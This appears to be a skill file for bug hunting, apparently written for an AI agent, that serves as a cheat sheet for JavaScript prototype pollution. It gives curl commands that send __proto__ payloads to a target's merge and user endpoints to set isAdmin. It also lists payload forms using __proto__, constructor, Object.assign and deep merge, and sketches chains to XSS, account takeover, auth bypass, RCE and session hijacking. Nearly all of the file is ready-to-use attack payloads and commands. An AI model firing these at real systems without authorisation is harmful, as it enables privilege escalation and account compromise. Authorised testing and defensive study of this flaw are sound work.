---
name: hunt-prototype-pollution
description: JS prototype pollution — __proto__, constructor, Object.assign, merge, clone. Chains to XSS, RCE, auth bypass.
---

# PROTOTYPE POLLUTION — 3 BULLETS MAX

**Core:** Inject properties into Object.prototype → affects all objects.

## DETECTION
```bash
# Basic test
curl -s -X POST "https://target.com/api/merge" -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
curl -s "https://target.com/api/users/me" | grep -i "isAdmin"
# If isAdmin=true → prototype pollution CONFIRMED
# Alternative
curl -s "https://target.com/api/user?__proto__[isAdmin]=true"
curl -s "https://target.com/api/merge?__proto__=polluted"
```

## ATTACKS
```
__proto__: {"__proto__":{"isAdmin":true}}
constructor: {"constructor":{"prototype":{"isAdmin":true}}}
merge/clone: send polluted object to server-side merge
Object.assign: pollute via Object.assign({}, userInput)
Deep merge: nested objects pollute prototype chain
```

## CHAINS
```
Prototype pollution → XSS (if polluted value in innerHTML) → ATO → Critical
Prototype pollution → auth bypass (isAdmin=true) → Critical
Prototype pollution → RCE (if server-side template rendering) → Critical
Prototype pollution → cookie poisoning → session hijack → High
```
